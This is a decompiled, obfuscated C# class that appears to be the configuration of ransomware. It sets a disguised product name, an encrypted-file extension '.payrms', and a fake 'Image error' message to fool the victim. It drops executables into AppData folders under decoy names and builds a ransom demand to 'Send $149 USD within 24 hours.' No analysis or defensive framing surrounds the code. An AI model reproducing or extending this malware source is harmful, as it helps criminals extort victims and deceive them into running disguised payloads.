using System;

namespace ns0;

internal static class Class2
{
	internal enum Enum0
	{
		const_0,
		const_1,
		const_2,
		const_3
	}

	internal const string string_0 = "Mordfud";

	internal const string string_1 = "Copyright (C) 2006-2016 Tempsof Corp. All rights reserved.";

	internal const string string_2 = "4.2.00.08";

	internal const string string_3 = ".payrms";

	internal const int int_0 = 10000000;

	internal const string string_4 = "RgIhHj33JL9hnls0Poi3e5==";

	internal static Enum0 enum0_0;

	internal static string string_5;

	internal static string string_6;

	internal static Class11.Enum1 enum1_0;

	internal static string string_7;

	internal static string string_8;

	internal static string string_9;

	internal static string string_10;

	internal static string string_11;

	internal static string string_12;

	internal static bool bool_0;

	internal static DateTime dateTime_0;

	internal static bool bool_1;

	internal static int int_1;

	internal static string string_13;

	internal static string string_14;

	internal static int int_2;

	static Class2()
	{
		bool_1 = false;
		int_1 = 6000;
		string text = Delegate200.smethod_0(Environment.SpecialFolder.ApplicationData);
		string text2 = Delegate200.smethod_0(Environment.SpecialFolder.LocalApplicationData);
		enum0_0 = Enum0.const_3;
		dateTime_0 = new DateTime(2016, 1, 1);
		string_5 = Delegate94.smethod_0(new string[5]
		{
			"Image error. Cant be displayed.",
			Delegate202.smethod_0(),
			"Error code 774588989",
			Delegate202.smethod_0(),
			"Windows Error"
		});
		string_6 = "Error";
		enum1_0 = Class11.Enum1.const_1;
		string_7 = "Nordsa\\Nordsa.exe";
		string_9 = "Magyrn\\Magyrn.exe";
		string_10 = Delegate98.smethod_0(text, string_9);
		string_8 = Delegate98.smethod_0(text2, string_7);
		string_11 = "System32Work\\";
		string_12 = Delegate98.smethod_0(text, string_11);
		if (!Delegate231.smethod_0(string_12))
		{
			Delegate34.smethod_0(string_12);
		}
		bool_0 = false;
		string_13 = ".";
		int_2 = 149;
		string_14 = Delegate223.smethod_0("Send $", int_2, " USD within 24 hours.");
	}
}
